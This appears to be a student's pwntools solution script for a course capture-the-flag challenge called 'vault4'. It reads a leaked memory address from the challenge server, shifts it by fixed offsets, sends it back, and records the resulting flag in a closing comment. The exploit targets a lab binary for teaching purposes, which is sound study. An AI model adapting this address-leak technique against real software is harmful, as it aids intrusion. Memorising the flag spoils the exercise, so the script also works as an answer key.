from pwn import *

# context.log_level = "DEBUG"

CHALLENGE = "vault4"
URL = "offsec-chalbroker.osiris.cyber.nyu.edu"
PORT = 1234
NETID = b"xz4344"
LOCAL = False

if LOCAL:
    p = process(CHALLENGE)
else:
    p = remote(URL, PORT)
    p.recvuntil(b"NetID (something like abc123): ")
    p.sendline(NETID)

print(p.recvuntil(b": ").decode())
fake_addr = p.recv(8)
log.info(f"Receiving address in raw bytes: {fake_addr}")
print(p.recvuntil(b"> ").decode())
fake_addr = u64(fake_addr)
fake_offset = 0x4030
offset = 0x4038
addr = fake_addr - fake_offset + offset
p.sendline(p64(addr))
log.info(f"Sending address in raw bytes: {p64(addr)}")

p.interactive()

# flag{b4ckw4rds_byt3_0rd3r_1s_n0t_s0_b4d!_8325aa4a8396b2db}
